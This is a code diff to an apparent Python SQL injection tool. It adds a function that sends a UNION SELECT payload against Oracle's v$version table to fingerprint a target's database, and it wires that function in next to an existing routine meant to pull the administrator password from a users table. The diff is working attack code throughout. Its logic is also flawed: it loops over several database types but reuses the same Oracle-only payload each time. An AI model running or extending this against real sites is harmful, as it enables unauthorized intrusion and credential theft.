@@ -107,6 +107,32 @@ def find_urls_to_test(url, base_url):
     
     return links
 
+def exploit_database_version(url):
+    
+    database_types = ['MySQL', 'PostgreSQL', 'Oracle', 'Microsoft SQL Server', 'SQLite']
+
+    try:
+        for db_type in database_types:
+            response = requests.get(f"{url}' AND 1=2 UNION SELECT NULL, banner FROM v$version--")
+            response.raise_for_status()
+
+            if re.search(db_type, response.text, re.IGNORECASE):
+                soup = BeautifulSoup(response.text, 'html.parser')
+                version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
+                
+                if version:
+                    print(f"[+] Found the database: {db_type} | The version is: {version.strip()}")
+                else:
+                    print(f"[+] Found the database: {db_type} | [-] Could not extract the version.")
+                
+                return
+        
+        print("[-] Could not detect the database type.")
+    
+    except requests.exceptions.RequestException as e:
+        print(f"[-] An error occurred while trying to detect the database version: {e}")
+
+
 def exploit_sqli_users_table(url):
     """
     Performs SQL injection to attempt to retrieve the administrator's password from the users table.
@@ -297,6 +323,7 @@ if __name__ == "__main__":
             
             # After testing general vulnerabilities, test for user table credentials
             exploit_sqli_users_table(test_url)
+            exploit_database_version(test_url)
             
     else:
         print("[-] No URLs with parameters found.")
